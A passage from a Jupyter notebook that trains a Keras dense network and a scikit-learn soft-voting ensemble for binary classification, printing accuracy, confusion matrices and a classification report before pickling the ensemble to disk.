      "Epoch 10/10\n",
      "1963/1963 [==============================] - 6s 3ms/step - loss: 0.3031 - accuracy: 0.8861 - val_loss: 0.5554 - val_accuracy: 0.5454\n",
      "614/614 - 1s - loss: 0.5558 - accuracy: 0.5448 - 762ms/epoch - 1ms/step\n",
      "\n",
      "Test accuracy: 0.5448384881019592\n",
      "\n",
      "Test loss: 0.5557768940925598\n",
      "614/614 [==============================] - 1s 986us/step\n",
      "[[1472 8490]\n",
      " [ 443 9221]]\n"
     ]
    }
   ],
   "source": [
    "\n",
    "# Define the model\n",
    "model = Sequential([\n",
    "    Dense(512, activation='relu', input_shape=(X_train.shape[1],)),  # Input layer with input_shape matching your features\n",
    "    Dropout(0.5),  # Dropout for regularization\n",
    "    Dense(256, activation='relu'),  # Hidden layer\n",
    "    Dropout(0.5),  # Dropout for regularization\n",
    "    Dense(1, activation='sigmoid')  # Output layer for binary classification\n",
    "])\n",
    "\n",
    "# Compile the model\n",
    "model.compile(optimizer='adam',\n",
    "              loss='binary_crossentropy',  # Use 'categorical_crossentropy' for multi-class classification\n",
    "              metrics=['accuracy'])\n",
    "\n",
    "# Train the model\n",
    "history = model.fit(X_train, y_train,\n",
    "                    epochs=10,\n",
    "                    batch_size=32,\n",
    "                    validation_split=0.2,  # Use a part of the training set for validation\n",
    "                    verbose=1)\n",
    "\n",
    "# Evaluate the model on the test set\n",
    "test_loss, test_acc = model.evaluate(X_test, y_test, verbose=2)\n",
    "print('\\nTest accuracy:', test_acc)\n",
    "print('\\nTest loss:', test_loss)\n",
    "\n",
    "# do a confusion matrix\n",
    "y_pred = model.predict(X_test)\n",
    "y_pred = (y_pred > 0.5)\n",
    "cm = confusion_matrix(y_test, y_pred)\n",
    "print(cm)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "e694de5e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Ensemble Model Accuracy: 0.9328951391011923\n",
      "Ensemble Model Confusion Matrix: [[9580  382]\n",
      " [ 935 8729]]\n",
      "Ensemble Classification Report:\n",
      "               precision    recall  f1-score   support\n",
      "\n",
      "           0       0.91      0.96      0.94      9962\n",
      "           1       0.96      0.90      0.93      9664\n",
      "\n",
      "    accuracy                           0.93     19626\n",
      "   macro avg       0.93      0.93      0.93     19626\n",
      "weighted avg       0.93      0.93      0.93     19626\n",
      "\n",
      "Ensemble model saved to disk.\n"
     ]
    }
   ],
   "source": [
    "from sklearn.linear_model import LogisticRegression\n",
    "from sklearn.naive_bayes import GaussianNB\n",
    "from sklearn.ensemble import RandomForestClassifier, ExtraTreesClassifier, VotingClassifier\n",
    "\n",
    "# Initialize individual models\n",
    "log_clf = LogisticRegression(random_state=42, max_iter=1000)\n",
    "dt_clf = RandomForestClassifier(n_estimators=100, max_depth=10, random_state=42)\n",
    "svm_clf = GaussianNB() # Enable probability for soft voting\n",
    "#svm_clf = ExtraTreesClassifier(n_estimators=100, max_depth=10, random_state=42)\n",
    "\n",
    "# Consider including your previously defined kNN model\n",
    "# knn_model = KNeighborsClassifier(n_neighbors=350)\n",
    "\n",
    "# load my model from .pkl file\n",
    "# with open('knn_model_counter.pkl', 'rb') as f:\n",
    "#      knn_model = pkl.load(f)\n",
    "\n",
    "\n",
    "# Create ensemble model using soft voting\n",
    "ensemble_clf = VotingClassifier(estimators=[\n",
    "    ('lr', log_clf),\n",
    "    ('dt', dt_clf),\n",
    "    ('svc', dt_clf),\n",
    "    # ('knn', knn_model)  # Add your kNN model\n",
    "    ], voting='soft')\n",
    "\n",
    "ensemble_clf.fit(X_train, y_train)\n",
    "\n",
    "# Predict on the test set\n",
    "ensemble_predictions = ensemble_clf.predict(X_test)\n",
    "\n",
    "# Evaluate the ensemble model\n",
    "ensemble_accuracy = accuracy_score(y_test, ensemble_predictions)\n",
    "ensemble_CMatrix = confusion_matrix(y_test, ensemble_predictions)\n",
    "\n",
    "# Print evaluation metrics\n",
    "print(\"Ensemble Model Accuracy:\", ensemble_accuracy)\n",
    "print(\"Ensemble Model Confusion Matrix:\", ensemble_CMatrix)\n",
    "print(\"Ensemble Classification Report:\\n\", classification_report(y_test, ensemble_predictions))\n",
    "\n",
    "import pickle\n",
    "\n",
    "# Save the ensemble model to disk\n",
    "with open('ensemble_model.pkl', 'wb') as f:\n",
    "    pickle.dump(ensemble_clf, f)\n",
    "\n",
    "print('Ensemble model saved to disk.')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [],
   "metadata": {
    "collapsed": false
   }
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
